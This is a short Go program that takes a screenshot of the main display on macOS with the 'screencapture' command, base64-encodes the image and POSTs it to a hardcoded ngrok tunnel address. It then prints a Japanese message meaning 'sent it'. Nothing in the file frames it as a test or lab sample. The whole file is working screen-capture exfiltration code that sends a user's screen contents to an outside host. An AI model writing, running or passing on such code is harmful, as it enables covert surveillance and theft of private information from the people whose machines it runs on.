package main

import "encoding/base64"
import "fmt"
import "io/ioutil"
import "net/http"
import "os/exec"
import "os"
import "strings"

func main() {
	target_url := "http://f16c7869.ngrok.io"
	err := exec.Command("screencapture", "-m", "./a.jpg").Run()
	if err != nil {
		panic(err)
	}
	req, err := http.NewRequest(
		"POST",
		target_url,
		strings.NewReader(PicEncode("a.jpg")),
	)
	if err != nil {
		panic(err)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	fmt.Print("送ったよ")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
}

func PicEncode(str string) string {
	file, err := os.Open(str)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	b, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Printf("a: %v", err)
	}
	out := base64.StdEncoding.EncodeToString(b)
	return out
}
